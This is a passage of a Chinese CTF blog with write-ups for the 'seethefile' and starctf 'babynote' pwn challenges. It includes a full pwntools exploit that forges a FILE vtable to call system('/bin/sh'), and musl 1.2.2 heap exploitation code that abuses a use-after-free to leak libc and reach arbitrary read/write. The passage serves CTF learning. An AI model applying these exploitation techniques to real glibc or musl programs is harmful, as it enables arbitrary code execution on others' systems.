<span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到，此时只是对file堆块进行了释放，而没有对其数据进行清空，io_read_ptr变为了main_arena,这是因为其加入了unsortedbins,但是这块是或否执行了unlink操作呢?但是我们看到了储存数据的堆块并没有进行free操作。这里这样操作，如果存在UAF是否可以实现泄露数据呢？</p>
<p>泄露地址的操作，在进行数据泄露的时候除了程序的内存表，还可以利用环境的相关内容。通过打开&#x2F;proc&#x2F;self&#x2F;mmap这个虚拟文件来获取当前进程的地址空间情况，</p>
</li>
<li><p>整体思路：1.泄露libc地址，获取system函数的真实地址</p>
<p>​    2.利用fp后面的bss伪造file_plus的结构体（）这部分内存全是空的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">name:<span class="number">0x0</span>,				<span class="comment">//0x20字节</span></span><br><span class="line">	<span class="number">0x0</span>,</span><br><span class="line">	<span class="number">0x0</span>,</span><br><span class="line">	<span class="number">0x0</span>,</span><br><span class="line">fp:fake_file_start </span><br><span class="line"><span class="comment">//下面时伪造的file</span></span><br><span class="line">flags_:<span class="number">0xffffdfff</span>			<span class="comment">//fake_file_start</span></span><br><span class="line">_io_read_ptr:<span class="string">&quot;;/bin/sh&quot;</span></span><br><span class="line"><span class="comment">//下面就可以全是0</span></span><br><span class="line">vtable:fake_file_start+<span class="number">0x94</span>+<span class="number">4</span> </span><br><span class="line"><span class="comment">//fake_vatable   fclose偏移为2</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy)：<span class="number">0</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2)）：<span class="number">0</span></span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish)：system_addr</span><br><span class="line"> <span class="comment">//剩下的全写0</span></span><br></pre></td></tr></table></figure>

<p>调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp-&gt;vtabl-&gt;__finish(fp)，此时实际上执行的system(fp);</p>
<p>因此此时的fp指针其实就是system的参数，虽然fp并未直接指向”&#x2F;bin&#x2F;sh”,但是system解析指令的时，无法解析0xffffdfff，便会继续向后检查，这里除了写”;bin&#x2F;sh“,话可以有”||&#x2F;bin&#x2F;sh“,覆盖后面的指针也问题不大</p>
</li>
</ol>
<h2 id="补充，后来复现在这个题的时候，发现通过上面的伪造方式，是无法实现vtable指针的改写，是因为数据过长后，到了bss下面的区域，这块区域会将数据清空，而且我们在改的过程中，还有一个值得注意的地方，就是io-file-里面-的-offset变量，一定要是我们fp指针的-4偏移"><a href="#补充，后来复现在这个题的时候，发现通过上面的伪造方式，是无法实现vtable指针的改写，是因为数据过长后，到了bss下面的区域，这块区域会将数据清空，而且我们在改的过程中，还有一个值得注意的地方，就是io-file-里面-的-offset变量，一定要是我们fp指针的-4偏移" class="headerlink" title="补充，后来复现在这个题的时候，发现通过上面的伪造方式，是无法实现vtable指针的改写，是因为数据过长后，到了bss下面的区域，这块区域会将数据清空，而且我们在改的过程中，还有一个值得注意的地方，就是io_file 里面 的_offset变量，一定要是我们fp指针的+4偏移"></a>补充，后来复现在这个题的时候，发现通过上面的伪造方式，是无法实现vtable指针的改写，是因为数据过长后，到了bss下面的区域，这块区域会将数据清空，而且我们在改的过程中，还有一个值得注意的地方，就是io_file 里面 的_offset变量，一定要是我们fp指针的+4偏移</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./seethefile&#x27;</span>)</span><br><span class="line">elf =ELF(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="number">0x804B260</span></span><br><span class="line">fp = <span class="number">0x804B280</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Your choice :&quot;</span> ,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_file</span>(<span class="params">file_path</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">open_file(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">ch(<span class="number">3</span>)</span><br><span class="line">ch(<span class="number">2</span>)</span><br><span class="line">ch(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;[heap]\n&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(<span class="string">b&quot;0x&quot;</span>+r.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] + libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">payload = <span class="string">b&#x27;\x01\xA0;/bin/sh\x00\x00&#x27;</span>+p32(system_addr)+p32(<span class="number">0</span>)*<span class="number">4</span>+p32(name)</span><br><span class="line">payload +=p32(<span class="number">0xcafebabe</span>)*<span class="number">5</span> + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0xcafebabe</span>)*<span class="number">4</span> +p32(name+<span class="number">4</span>)</span><br><span class="line">payload =payload.ljust(<span class="number">0x94</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(<span class="number">0x0804b264</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r,<span class="string">&#x27;b *0x08048AF5&#x27;</span>)</span><br><span class="line">ch(<span class="number">5</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结：这个文章内容比较多，但是重点就在与io_file_plus 以及虚表的使用，有时候较低的版本可以不去伪造vtable,而时可以直接修改vtable的数据，但是当下的新版本不在可以。对于不同的函数有不同的利用姿势。、</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>starctf_babynote</title>
    <url>/2022/04/19/starctf-babynote/</url>
    <content><![CDATA[<h1 id="starctf-babynote-musl1-2-2"><a href="#starctf-babynote-musl1-2-2" class="headerlink" title="starctf    babynote musl1.2.2"></a>starctf    babynote musl1.2.2</h1><h2 id="环境以及保护"><a href="#环境以及保护" class="headerlink" title="环境以及保护"></a>环境以及保护</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop<span class="comment">/*ctf/babbynote/attachment$ file babynote </span></span><br><span class="line"><span class="comment">babynote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped</span></span><br><span class="line"><span class="comment">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ checksec --file=babynote</span></span><br><span class="line"><span class="comment">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span></span><br><span class="line"><span class="comment">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	  No	0		2		babynote</span></span><br><span class="line"><span class="comment">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ ./libc.so </span></span><br><span class="line"><span class="comment">musl libc (x86_64)</span></span><br><span class="line"><span class="comment">Version 1.2.2</span></span><br><span class="line"><span class="comment">Dynamic Program Loader</span></span><br><span class="line"><span class="comment">Usage: ./libc.so [options] [--] pathname [args]</span></span><br><span class="line"><span class="comment">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ </span></span><br></pre></td></tr></table></figure>

<p>第一次做musl 的题目，有点迷茫。一边查资料一边摸着做。比赛的时候没有任何的突破。</p>
<h2 id="探索的过程"><a href="#探索的过程" class="headerlink" title="探索的过程"></a>探索的过程</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop<span class="comment">/*ctf/babbynote/attachment$ ./libc.so babynote </span></span><br><span class="line"><span class="comment">                                                   </span></span><br><span class="line"><span class="comment">    _/  _/  _/        _/_/_/  _/_/_/_/_/  _/_/_/_/ </span></span><br><span class="line"><span class="comment">     _/_/_/        _/            _/      _/        </span></span><br><span class="line"><span class="comment">  _/_/_/_/_/      _/            _/      _/_/_/     </span></span><br><span class="line"><span class="comment">   _/_/_/        _/            _/      _/          </span></span><br><span class="line"><span class="comment">_/  _/  _/        _/_/_/      _/      _/           </span></span><br><span class="line"><span class="comment">                                                   </span></span><br><span class="line"><span class="comment">                                                   </span></span><br><span class="line"><span class="comment">--------menu-------</span></span><br><span class="line"><span class="comment">1: add a note</span></span><br><span class="line"><span class="comment">2: find a note</span></span><br><span class="line"><span class="comment">3: delete a note</span></span><br><span class="line"><span class="comment">4: forget all notes</span></span><br><span class="line"><span class="comment">5: exit</span></span><br><span class="line"><span class="comment">option:</span></span><br></pre></td></tr></table></figure>

<p>发现并没有edit的功能。</p>
<p>反汇编以后，对于结构体的认知。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> babynote        struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> name            dq ?</span><br><span class="line"><span class="number">00000008</span> note            dq ?</span><br><span class="line"><span class="number">00000010</span> name_size       dq ?</span><br><span class="line"><span class="number">00000018</span> note_size       dq ?</span><br><span class="line"><span class="number">00000020</span> next            dq ?</span><br><span class="line"><span class="number">00000028</span> babynote        ends</span><br></pre></td></tr></table></figure>

<p>存在一个全局数组，储存了abbynote的指针，形成一个单链表。采用头插法进行添加。</p>
<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  babynote *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ptr = (babynote *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">  ptr-&gt;name_size = addname(&amp;ptr-&gt;name);</span><br><span class="line">  ptr-&gt;note_size = addnote(&amp;ptr-&gt;note);</span><br><span class="line">  ptr-&gt;next = (__int64)<span class="built_in">list</span>;</span><br><span class="line">  <span class="built_in">list</span> = (babynote **)ptr;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*--------------------------------------------------------*/</span></span><br><span class="line">__int64 __fastcall <span class="title function_">addname</span><span class="params">(__int64 *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name size: &quot;</span>);</span><br><span class="line">  size = getnum();</span><br><span class="line">  *ptr = (__int64)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);           <span class="comment">// calloc清空数据</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)readnode(*ptr, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">readnode</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 &gt; (<span class="type">int</span>)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    *(_BYTE *)(a1 + (<span class="type">int</span>)i) = buf;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="string">&#x27;\n&#x27;</span> )                          <span class="comment">// 一字节\x00溢出</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)((<span class="type">int</span>)i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*--------------------------------------------------------*/</span></span><br><span class="line">__int64 __fastcall <span class="title function_">addnote</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;note size: &quot;</span>);</span><br><span class="line">  size = getnum();</span><br><span class="line">  *(_QWORD *)a1 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;note content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)readnode(*(_QWORD *)a1, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>add 添加时，ida分析的结果并不准确，这里永远存在一字节的空溢出。</p>
<p>后来根据网上查到的学习资料。由于musl 的堆管理比较简单，这个空溢出可以用来修改chunk的idx位，伪造meta。</p>
<p>后面再说。</p>
<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>find会创建一个name的chunk,然后根据size以及list保留的size,cmp，最后比较字符串。如果相同就返回第一个找到的符合要求的babynote指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">find</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  babynote *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = <span class="number">0LL</span>;</span><br><span class="line">  size = addname(&amp;ptr);</span><br><span class="line">  v3 = cmp(ptr, size);                          <span class="comment">// 确认数据</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    info(v3-&gt;note, v3-&gt;note_size);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oops.....&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出babynote的信息</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">info</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%#lx:&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 &gt; i; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, a1[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的信息也会收到size的限制。当时我有看到一个点，就是i是有符号的，而a2无符号。但是貌似没有什么价值。最后free那个临时创建的chunk.</p>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  babynote *v1; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  babynote **i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  babynote *ptr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0LL</span>;</span><br><span class="line">  size = addname(&amp;v1);</span><br><span class="line">  ptr = cmp(v1, size);                          <span class="comment">// /删除某个特定的</span></span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptr != <span class="built_in">list</span> || <span class="built_in">list</span>-&gt;next )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ptr-&gt;next )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = &amp;<span class="built_in">list</span>; ptr != *i; i = &amp;(*i)-&gt;next )</span><br><span class="line">          ;</span><br><span class="line">        *i = ptr-&gt;next;</span><br><span class="line">      &#125;                                         <span class="comment">// 解链表</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">list</span> = <span class="number">0LL</span>;                               <span class="comment">// 删除头指针，就清空了所有</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(ptr-&gt;name);</span><br><span class="line">    <span class="built_in">free</span>(ptr-&gt;note);                            <span class="comment">// 释放note</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oops.....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(v1);                                     <span class="comment">// 删除临时结构体</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>删除note的时候，会遍历链表，找到对应的指针后，会set对应结构的next指针。p-&gt;next &#x3D; p-&gt;next-&gt;next.但是如果ptr是尾指针，就不会进行set.存在UAF</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>delete最后一个，只会free对应的堆块，但是倒数第二个babynote的next没有reset,所以就存在了uaf.但是musl的堆块释放后并不会进入bins。只有meta的所有avail_maks都被释放后才会将meta释放，并把meta放入双链表，dequeue（所以meta free后是）</p>
<p>程序的了漏洞在于delete时存在的UAF,如果我们将其释放后，并对其note进行reuse,而且用作babbynote,就会在slot上储存3个指针，导致heapaddr 泄露。但是这里需要布置对的结构。</p>
<p><em><strong><u>musl的堆比较特殊，meta页是按照顺序申请的，而且与group页隔离。当同一个size的meta分配满之后，如果继续申请，会使用avail_meta保留的一个meta地址，当然这了meta是全新的。而且，一旦申请后，malloc_context active 数组对应位置就会保留正在分配的meta.同时会将这两个meta的prev next设置，形成双链表。如果其中一个meta满无法分配，或者被free，就会解开连表。full_meta 的prev 和next 被清零。</u></strong></em></p>
<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>回到题目，这里我们可以泄露group组的地址，slot地址是在libc 的基础上得到的，所以泄露出heap的用户区地址就可以得到里libc地址。</p>
<p>我们利用堆风水，将链表的最后一个bebynote释放，存在uaf，然后通过构造，拿到他的note slot作为一个新的babynote,这杨这里就储存了heapd 的地址，然后泄露。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#slot full size is 0x2c</span></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x50</span>)<span class="comment">#slot full size is 0x6c</span></span><br><span class="line">free(<span class="string">b&#x27;a&#x27;</span>)				<span class="comment">#free the first note,the meta(0xc)is freed,</span></span><br><span class="line">clean()					<span class="comment">#now meta(0x2c) has one no use,and 1 freed,meta(0xc) heav 3 freed</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)		<span class="comment">#we alloc the last slot in meta(0x2c) for abynote,</span></span><br><span class="line">						<span class="comment">#.Reuse the 0 solt in meta(0xc) (malloc from bins),</span></span><br><span class="line">						<span class="comment">#then reuse the free slot in meta(0x2c)</span></span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)			<span class="comment">#malloc a slot(0x2c) in a new meta2(0x2c,and malloc 2 slot(0xc) in meta(0xc)</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">b&#x27;a&#x27;</span>)			<span class="comment">#malloc a new slot(0xc),in meta(0xc),then free babynote a,then meta1(0x2c) will have 2 freed slot</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#malloc 3slot from  meta2(0x2c),so meta1(0x2c),have 2 freed slot</span></span><br><span class="line">add(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#</span></span><br><span class="line">add(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#fill up meta2(0x2c)</span></span><br><span class="line">add(<span class="string">b&#x27;f&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x50</span>)		<span class="comment">#malloc a baby note from meta1(0x2c),meta1(0x2c) still have one freed, </span></span><br><span class="line"></span><br><span class="line">find(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;0x28:&quot;</span>)</span><br><span class="line">ss = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	ss = r.recv(<span class="number">2</span>)+ss</span><br><span class="line">ss  = <span class="string">b&#x27;0x&#x27;</span>+ss</span><br><span class="line"><span class="built_in">print</span>(ss)</span><br><span class="line">libcbase = <span class="built_in">int</span>(ss,<span class="number">16</span>) -  <span class="number">0x29fdf0</span></span><br><span class="line">stdout = libcbase + <span class="number">0x2a0e00</span></span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">__malloc_context = <span class="number">0x2a1aa0</span>+libcbase</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stdout : &quot;</span>,<span class="built_in">hex</span>(stdout))</span><br></pre></td></tr></table></figure>

<h3 id="泄露其他地址（meta）"><a href="#泄露其他地址（meta）" class="headerlink" title="泄露其他地址（meta）"></a>泄露其他地址（meta）</h3><p>这里，meta1(0x2c)还有一个freed slot ，我们其实就是通过这个泄露的heap。find一个很重要的点就是，会addname.而且就算查不到也不出错，然后再将其释放，所以我们可以由此来重复利用这个freed slot。find的时候，这要size合适，就会将它返回给我们，然后在里面写入数据。并释放。之前我们说过，这里可以泄露heap地址，是因为他是我们list的最后一个banynote,delete后上一个babynote的next指针依旧指向这个slot，所以导致泄露。</p>
<p><img src="C:\Users\32644\AppData\Roaming\Typora\typora-user-images\image-20220420203251874.png" alt="image-20220420203251874"></p>
<p>所以我们可以进行任意地址读。将__malloc_context 的地址写在note的位置，就可以泄露，同时我们还可以改变notesize,控制泄露的长度。</p>
<p>由于musl的堆管理机制，虽然与glibc完全不一样，但是感觉通过代码分析是更容易的。</p>
<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>musl的任意地址写与glibc的unlink核心想法一致，只不过是前面的检查方式不一样。我们一步步来分析。</p>
<p>首先musl的堆块不会进入bins，只有meta被释放的时候，才会加入freed_meta双链表。当meta分配出去的slot全部被释放的时候，meta会被释放。</p>
<h4 id="meta的-结构"><a href="#meta的-结构" class="headerlink" title="meta的 结构"></a>meta的 结构</h4><p>meta结构一共占用40bytes</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> meta*)<span class="number">0x55555730d4f0</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  prev = <span class="number">0x55555730d4f0</span>, </span><br><span class="line">  next = <span class="number">0x55555730d4f0</span>, </span><br><span class="line">  mem = <span class="number">0x7f6431216c30</span>, </span><br><span class="line">  avail_mask = <span class="number">262</span>, </span><br><span class="line">  freed_mask = <span class="number">0</span>, </span><br><span class="line">  last_idx = <span class="number">9</span>, </span><br><span class="line">  freeable = <span class="number">1</span>, </span><br><span class="line">  sizeclass = <span class="number">2</span>, </span><br><span class="line">  maplen = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; x/8gx 0x55555730d4f0</span></span><br><span class="line"><span class="comment">0x55555730d4f0:	0x000055555730d4f0	0x000055555730d4f0</span></span><br><span class="line"><span class="comment">0x55555730d500:	0x00007f6431216c30	0x0000000000000106</span></span><br><span class="line"><span class="comment">0x55555730d510:	0x00000000000000a9</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>prev与next分别指向上一个或者下一个meta（meta在freed_meta链表中）。mem指向管理meta的group，而group又包含的一下简单信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> group*)<span class="number">0x55555730d4f0</span></span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  meta = <span class="number">0x55555730d4f0</span>, </span><br><span class="line">  active_idx = <span class="number">16</span> <span class="string">&#x27;\020&#x27;</span>, </span><br><span class="line">  pad = <span class="string">&quot;\324\060WUU\000&quot;</span>, </span><br><span class="line">  storage = <span class="number">0x55555730d500</span> <span class="string">&quot;0l!1d\177&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

